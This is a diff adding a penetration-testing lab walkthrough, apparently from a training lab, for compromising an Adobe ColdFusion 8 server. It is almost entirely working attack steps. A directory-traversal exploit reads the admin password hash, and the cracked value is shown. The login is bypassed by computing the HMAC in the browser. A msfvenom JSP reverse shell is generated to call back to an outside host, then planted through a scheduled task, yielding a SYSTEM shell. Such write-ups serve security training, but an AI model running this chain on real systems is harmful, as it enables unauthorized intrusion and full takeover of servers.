@@ -1,0 +1,43 @@
+# 1 found accessible login page
+http://10.11.1.10/CFIDE/administrator/index.cfm
+
+# 2 get server name and version
+Adobe ColdFusion 8
+
+# 3 find exploits
+searchsploit Adobe ColdFusion
+dobe ColdFusion - Directory Traversal  | multiple/remote/14641.py
+
+# 4 reveal hashed password
+python2 14641.py 10.11.1.10 80 ./../../../../../../../../../ColdFusion8/lib/password.properties
+password=AAFDC23870ECBCD3D557B6423A8982134E17927E 
+encrypted=true
+
+# 5 (bypass) login
+	# crack password
+	AAFDC23870ECBCD3D557B6423A8982134E17927E:pass123
+
+	OR
+
+	# observe how the login page works
+	<form name="loginform" action="/CFIDE/administrator/enter.cfm" method="POST" onsubmit="cfadminPassword.value = hex_hmac_sha1(salt.value, hex_sha1(cfadminPassword.value));">
+	1. The password is taken from the password field and hashed using sha1.(client side)
+	2. Hashed password is HMAC-ed using a salt value taken from the parameter salt field. (client side)
+	3. The HMAC-ed password gets sent to the server with the salt value. It probably verifies the hashed password was HMAC-ed with the correct salt value
+
+	# calculate the cfadminPassword.value in the browser with the current salt
+	console.log(hex_hmac_sha1(document.loginform.salt.value, 'AAFDC23870ECBCD3D557B6423A8982134E17927E'));
+
+	# changing cfadminPassword to the calculated cfadminPassword.value on the intercepter (burp) to bypass client side calculation
+
+# 6 create payload
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.119.191 LPORT=12345 -o shell.jsp
+
+# 7 set up scheduled task 
+URL: http://192.168.119.191:9000/shell.jsp
+File: C:\Inetpub\wwwroot\CFIDE\administrator\shell.jsp (can be found on Mappings)
+
+# 8 obtain shell
+http://10.11.1.10/CFIDE/administrator/shell.jsp
+nt authority\system
+
